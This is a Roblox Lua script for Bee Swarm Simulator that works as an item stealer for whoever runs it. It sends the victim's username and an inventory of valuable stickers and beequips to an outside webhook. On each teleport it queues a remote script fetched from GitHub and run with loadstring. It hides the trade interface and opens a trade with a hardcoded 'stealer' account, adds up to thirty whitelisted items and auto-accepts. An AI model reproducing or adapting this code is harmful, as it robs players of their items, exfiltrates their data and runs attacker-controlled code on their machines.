repeat task.wait() until game:IsLoaded()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local LocalPlayerID = LocalPlayer.UserId
local PlayerGui = LocalPlayer.PlayerGui
local ScreenGui = PlayerGui:WaitForChild("ScreenGui", math.huge)
local TradeLayer = ScreenGui:WaitForChild("TradeLayer", math.huge)

local Events = require(ReplicatedStorage.Events)
local StickerFile = require(ReplicatedStorage.Stickers.StickerFile)
local StickerTools = require(ReplicatedStorage.Stickers)
local StickerBookMenu = require(ReplicatedStorage.Gui.StickerMenus.StickerBookMenu)

local MAX_OFFER_SIZE = 30

local StealerName = "altbeeswarmacc17"
local StealerPlayer = nil
local StealerID = nil

local VictimIsTrading = nil
local StealerIsTrading = nil

local WhitelistedStickers = {
	"Brown Cub Skin",
	"Robo Cub Skin",
	"Stick Bug Skin",
	"Star Cub Skin",
	"Noob Cub Skin",
	"Bee Cub Skin",
	"Gingerbread Cub Skin",
	"Snow Cub Skin",
	"Peppermint Robo Cub Skin",
	"Doodle Cub Skin",
	"Wavy Yellow Hive Skin",
	"Wavy Cyan Hive Skin",
	"Wavy Purple Hive Skin",
	"Wavy Festive Hive Skin",
	"Wavy Doodle Hive Skin",
	"Icy Crowned Hive Skin",
	"Bear Bee Voucher",
	"Cub Buddy Voucher",
	"x2 Bee Gather Voucher",
	"x2 Convert Speed Voucher",
	"Offline Voucher",
	"Round Basic Bee",
	"Diamond Diamond Bee",
	"4-Pronged Vector Bee",
	"Bear Bee Offer",
	"Tabby Scratch",
	"Tabby From Behind",
	"Fuzz Bomb", 
	"Precise Eye",
	"Chef Hat Polar Bear",
	"Shy Brown Bear",
	"Sitting Mother Bear",
	"Squashed Head Bear",
	"Stretched Head Bear",
	"Dapper From Above",
	"Sideways Spirit Bear",
	"Glowering Gummy Bear",
	"Stranded Sun Bear",
	"Walking Stick Nymph",
	"Right Facing Stump Snail",
	"Standing Bean Bug",
	"Small Blue Chick",
	"Yellow Sticky Hand",
	"Auryn",
	"Triple Exclamation",
	"Eviction",
	"Fork And Knife",
	"Shining Halo",
	"Small Shield",
	"Robot Head",
	"Cyan Hilted Sword",
	"Cool Backpack",
	"Hourglass",
	"Wall Crack",
	"Glowing Smile",
	"Saturn",
	"Black Star",
	"Pearl Girl",
	"Abstract Color Painting",
	"Prism Painting",
	"Banana Painting",
	"Moai",
	"Nessie",
	"Ionic Column Top",
	"Ionic Column Middle",
	"Ionic Column Base",
	"Left Gold Swirl Fleuron",
	"Right Gold Swirl Fleuron",
	"Left Shining Diamond Fleuron",
	"Right Shining Diamond Fleuron",
	"Left Mythic Gem Fleuron",
	"Right Mythic Gem Fleuron",
	"Purple Fleuron",
	"Royal Symbol",
	"Royal Bear",
	"Mythic M",
	"Satisfying Nectar Icon",
	"Refreshing Nectar Icon",
	"Motivating Nectar Icon",
	"Invigorating Nectar Icon",
	"Comforting Nectar Icon",
	"Black Truffle Mushroom",
	"Prismatic Mushroom",
	"Scooper",
	"Rake",
	"Electro-Magnet",
	"Scissors",
	"Honey Dipper",
	"Bubble Wand",
	"Scythe",
	"Golden Rake",
	"Spark Staff",
	"Gummyballer",
	"Capricorn Star Sign",
	"Aquarius Star Sign",
	"Pisces Star Sign",
	"Aries Star Sign",
	"Taurus Star Sign",
	"Gemini Star Sign",
	"Cancer Star Sign",
	"Leo Star Sign",
	"Virgo Star Sign",
	"Libra Star Sign",
	"Scorpio Star Sign",
	"Sagittarius Star Sign",
	"Sunflower Field Stamp",
	"Dandelion Field Stamp",
	"Mushroom Field Stamp",
	"Blue Flower Field Stamp",
	"Clover Field Stamp",
	"Strawberry Field Stamp",
	"Spider Field Stamp",
	"Bamboo Field Stamp",
	"Pineapple Patch Stamp",
	"Stump Field Stamp",
	"Cactus Field Stamp",
	"Pumpkin Patch Stamp",
	"Pine Tree Forest Stamp",
	"Rose Field Stamp",
	"Hub Field Stamp",
	"Mountain Top Field Stamp",
	"Pepper Patch Stamp",
	"Coconut Field Stamp",
	"Ant Field Stamp",
	"Green Beesmas Light",
	"Blue Beesmas Light",
	"Red Beesmas Light",
	"Yellow Beesmas Light",
	"Critter In A Stocking",
	"Flying Festive Bee",
	"Flying Bee Bear",
	"Party Robo Bear",
	"Festive Pufferfush",
	"Festive Pea",
	"BBM From Below",
}

local WhitelistedBeequips = {
	"Kazoo",
	"Whistle",
	"Paperclip",
	"Charm Bracelet",
	"Beret",
	"Bead Lizard",
	"Pink Shades",
	"Camphor Lip Balm",
	"Candy Ring",
	"Elf Cap",
	"Beesmas Top",
	"Pinecone",
	"Icicles",
	"Beesmas Tree Hat",
	"Snow Tiara",
	"Reindeer Antlers",
	"Horn Ornament",
	"Paper Angel",
	"Toy Drum",
	"Lump Of Coal",
	"Festive Wreath"
}

local function WaitForLoad()
	StealerPlayer = Players:WaitForChild(StealerName, math.huge)
	StealerID = StealerPlayer.UserId
	workspace:WaitForChild(StealerName, math.huge)
	VictimIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
	StealerIsTrading = StealerPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
end

local function GetPlayerStats()
	return Events.ClientCall("RetrievePlayerStats")
end

local function GetStickersFilesFrom(StorageType)
	return GetPlayerStats().Stickers[StorageType]
end

local function GetBeequipsFiles()
	local PlayerStats = GetPlayerStats()
	
	local Beequips = {}
	
	local CaseBeequips = PlayerStats.Beequips.Case
	
	for _, FakeFile in pairs(CaseBeequips) do
		table.insert(Beequips, FakeFile.File)
	end
	
	local StorageBeequips = PlayerStats.Beequips.Storage
	
	for _, FakeFile in pairs(StorageBeequips) do
		table.insert(Beequips, FakeFile)
	end
	
	return Beequips
end

local function GetTypeDef(FakeFile)
	local ActualFile = StickerFile.FromData(FakeFile)
	local TypeDef = ActualFile:GetTypeDef()

	return TypeDef
end

local function GetWhitelistedStickers(Storage)
	local WhitelistedFiles = {}

	for _, FakeFile in (Storage) do
		local TypeDef = GetTypeDef(FakeFile)

		if table.find(WhitelistedStickers, TypeDef.Name) then 
			table.insert(WhitelistedFiles, FakeFile)
		end
	end

	return WhitelistedFiles
end

local function GetWhitelistedBeequips(Beequips)
	local WhitelistedFiles = {}
	
	for _, FakeFile in pairs(Beequips) do
		local InternalName = FakeFile.T
		
		if table.find(WhitelistedBeequips, InternalName) then
			table.insert(WhitelistedFiles, FakeFile)
		end
	end
	
	return WhitelistedFiles
end

local function GetNextFreeSlot(PlayerStats)
	local PlayerStats = GetPlayerStats()
	return StickerTools.PlayerStatsToFirstEmptyBookIndex(PlayerStats)
end

local function DiscardSticker(FakeFile)
	Events.ClientCall("StickerDiscard", FakeFile)
end

local function ClaimInboxSticker(FakeFile)
	FakeFile = StickerFile.FromData(FakeFile)
	StickerBookMenu.PressButtonClaimFromInbox(FakeFile)
end

local function AddTradeSticker(FakeFile, SessionID)
	local TypeDef = GetTypeDef(FakeFile)

	local StickerCategory = TypeDef.CosmeticType

	Events.ClientCall("TradePlayerAddItem", SessionID, {
		["File"] = FakeFile,
		["Category"] = StickerCategory
	})
end

local function AddTradeBeequip(FakeFile, SessionID)
	Events.ClientCall("TradePlayerAddItem", SessionID, {
		["File"] = FakeFile,
		["Category"] = "Beequip"
	})
end

local function AcceptTrade(SessionID)
	Events.ClientCall("TradePlayerAccept", SessionID, {
		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
		[tostring(StealerID)] = {}
	})
	
	task.wait(1)
	
	Events.ClientCall("TradePlayerAccept", SessionID, {
		[tostring(LocalPlayerID)] = require(ReplicatedStorage.Gui.TradeGui).GetMyOffer(),
		[tostring(StealerID)] = {}
	})
end

queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/umidk1837bss/purple-atlas/refs/heads/main/ap.lua'))()")

local function FakeReload()
	local HttpService = game:GetService("HttpService")
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")

	local placeId = game.PlaceId
	local currentJob = game.JobId

	local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
	local response = HttpService:JSONDecode(game:HttpGet(url))

	for _, server in ipairs(response.data) do
		if server.playing < server.maxPlayers and server.id ~= currentJob then
			TeleportService:TeleportToPlaceInstance(placeId, server.id, Players.LocalPlayer)
			break
		end
	end
end

local function SendWebhook()
	local Stickers = GetStickersFilesFrom("Book")
	local Beequips = GetBeequipsFiles()
	
	Stickers = GetWhitelistedStickers(Stickers)
	Beequips = GetWhitelistedBeequips(Beequips)

	local tohex=function(h)
		return h:gsub(".", function(v) return string.format("%02x", v:byte()) end)
	end
	
	local WebhookURL = "https://autumn-field-98ca.wahitoka65.workers.dev/"
	if game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value == false then
		request({
			Url = WebhookURL,
			Body = tohex(HttpService:JSONEncode({content = "executed but in private server (username =" .. LocalPlayer.Name .. ")"})),
			Method = "POST",
			Headers = {
				["content-type"] = "application/json"
			}
		})
	end
	
	local StickersToSend = {}
	local BeequipsToSend = {}
	
	for _, FakeFile in pairs(Stickers) do
		local TypeDef = GetTypeDef(FakeFile)
		table.insert(StickersToSend, TypeDef.Name)
	end
	
	for _, FakeFile in pairs(Beequips) do
		table.insert(BeequipsToSend, FakeFile.T)
	end

	local data = {
		["embeds"] = {
			{
				["title"] = LocalPlayer.Name,
				["description"] = "**Stickers**\n" .. (#StickersToSend > 0 and table.concat(StickersToSend, ", ") or "None") ..
								"\n**Beequips**\n" .. (#BeequipsToSend > 0 and table.concat(BeequipsToSend, ", ") or "None") ..
								string.format("\n**Teleport to server**\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId,\"%s\",game.Players.LocalPlayer)```", game.JobId),
				["color"] = 0xFFD700 -- gold color
			}
		}
	}

	data = HttpService:JSONEncode(data)

	request({
		Url = WebhookURL,
		Body = tohex(data),
		Method = "POST",
		Headers = {
			["content-type"] = "application/json"
		}
	})
end

local function HideTradeGui()
	TradeLayer.Visible = false
	TradeLayer:GetPropertyChangedSignal("Visible"):Connect(function()
		if TradeLayer.Visible == true then 
			TradeLayer.Visible = false
		end
	end)
	
	local BlurShade = ScreenGui:WaitForChild("BlurShade", math.huge)
	BlurShade.Visible = false
	BlurShade:GetPropertyChangedSignal("Visible"):Connect(function()
		if BlurShade.Visible == true then 
			BlurShade.Visible = false
		end
	end)
	
	task.spawn(function()
		local Blur = Lighting:WaitForChild("Blur", math.huge)
		Blur.Enabled = false
		Blur:GetPropertyChangedSignal("Enabled"):Connect(function()
			if Blur.Enabled == true then 
				Blur.Enabled = false
			end
		end)
	end)
	
	local MessagePromptBox = ScreenGui:WaitForChild("MessagePromptBox", math.huge)
	MessagePromptBox.Visible = false
	MessagePromptBox:GetPropertyChangedSignal("Visible"):Connect(function()
		if MessagePromptBox.Visible == true then 
			MessagePromptBox.Visible = false
		end
	end)
end

local function EnablePlayerMovement()
	local MasterControl = LocalPlayer:WaitForChild("PlayerScripts", math.huge):WaitForChild("ControlScript", math.huge):WaitForChild("MasterControl", math.huge)
	require(MasterControl):Enable()
end


local SessionID = nil
local function StealingSession()
	while VictimIsTrading.Value == true or StealerIsTrading.Value == true do
		task.wait()
	end

	Events.ClientListen("TradeUpdateInfo", function(IncomingData)
		SessionID = IncomingData.SessionID
	end)

	Events.ClientCall("TradePlayerRequestStart", StealerID)

	TradeLayer:WaitForChild("TradeAnchorFrame", math.huge)
	
	EnablePlayerMovement()
	
	while SessionID == nil do task.wait() end

	local BookStickers = GetStickersFilesFrom("Book")
	local WhitelistedBook = GetWhitelistedStickers(BookStickers)
	
	local MaxSize = #WhitelistedBook >= MAX_OFFER_SIZE and MAX_OFFER_SIZE or #WhitelistedBook
	
	if #WhitelistedBook > 0 then
		for _, FakeFile in pairs(WhitelistedBook) do
			if MaxSize == 0 then break end
			task.wait(0.15)
			AddTradeSticker(FakeFile, SessionID)
			MaxSize -= 1
		end
	end
	
	local Beequips = GetBeequipsFiles()
	local WhitelistedBQs = GetWhitelistedBeequips(Beequips)
	
	local SpaceLeft = MAX_OFFER_SIZE - #WhitelistedBook
	
	if #WhitelistedBQs > 0 and SpaceLeft > 0 then
		for _, FakeFile in pairs(WhitelistedBQs) do
			if SpaceLeft == 0 then break end
			task.wait(0.15)
			AddTradeBeequip(FakeFile, SessionID)
			SpaceLeft -= 1
		end
	end
		
	task.wait(3)

	AcceptTrade(SessionID)
end

if SendWebhook() then return end

WaitForLoad()

HideTradeGui()

while Players:FindFirstChild(StealerName) and wait(1) do
	StealingSession()
end
